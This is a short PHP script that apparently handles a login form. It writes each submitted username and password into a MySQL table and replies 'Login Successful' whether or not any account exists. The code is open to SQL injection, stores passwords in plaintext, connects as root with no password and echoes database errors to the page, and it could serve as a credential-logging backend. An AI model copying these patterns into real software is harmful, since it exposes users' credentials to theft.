<?php
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $server = "localhost";
    $db_username = "root";
    $db_password = "";
    $database = "info_login"; // Replace with your actual database name

    // Create connection
    $conn = mysqli_connect($server, $db_username, $db_password, $database);

    // Check connection
    if (!$conn) {
        die("Connection to database failed: " . mysqli_connect_error());
    }

    // SQL query to insert login details into the database
    $sql = "INSERT INTO `info_login` (`username`, `password`, `dt`) VALUES ('$username', '$password', current_timestamp())";

    if ($conn->query($sql) === TRUE) {
        echo "Login Successful";
    } else {
        echo "ERROR: $sql <br> $conn->error";
    }

    // Close connection
    $conn->close();
}
?>
